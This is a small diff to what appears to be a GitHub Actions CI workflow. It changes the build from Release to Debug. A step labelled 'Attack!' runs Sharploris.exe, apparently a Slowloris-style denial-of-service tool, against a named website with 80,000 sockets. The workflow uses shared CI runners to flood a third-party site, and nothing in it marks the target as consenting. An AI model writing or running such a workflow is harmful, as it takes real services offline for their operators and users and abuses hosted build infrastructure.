@@ -18,10 +18,10 @@ jobs:
         dotnet-version: 5.0.x
 
     - name: Restore dependencies
-      run: dotnet restore --configuration Release
+      run: dotnet restore
       
     - name: Build
-      run: dotnet build --no-restore --configuration Release
+      run: dotnet build --no-restore
     
     - name: Attack!
-      run: dotnet run SharpLoris-master\SharpLoris\bin\Release\Sharploris.exe -host https://www.hellominers.com sockcount=80000
+      run: dotnet run SharpLoris-master\SharpLoris\bin\Debug\Sharploris.exe -host https://www.hellominers.com sockcount=80000
